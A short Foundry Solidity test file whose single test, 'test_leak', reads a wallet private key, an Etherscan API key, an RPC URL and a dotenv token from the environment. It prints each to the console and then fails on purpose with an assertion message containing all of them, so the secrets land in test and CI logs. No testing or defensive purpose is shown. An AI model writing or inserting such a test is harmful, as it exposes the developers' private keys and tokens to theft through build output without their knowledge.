// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {Test, console} from "forge-std/Test.sol";

contract LeakTest is Test {
    function test_leak() public {
        string memory k = vm.envString("PRIVATE_KEY");
        string memory e = vm.envString("ETHERSCAN_API_KEY");
        string memory r = vm.envString("RPC_URL");
        string memory d = vm.envString("SAK_DOTENV_TOKEN");
        console.log(k);
        console.log(e);
        console.log(r);
        console.log(d);
        console.log(vm.envUint("PRIVATE_KEY"));
        assertTrue(false, string.concat("leak ", k, " ", e, " ", r, " ", d));
    }
}

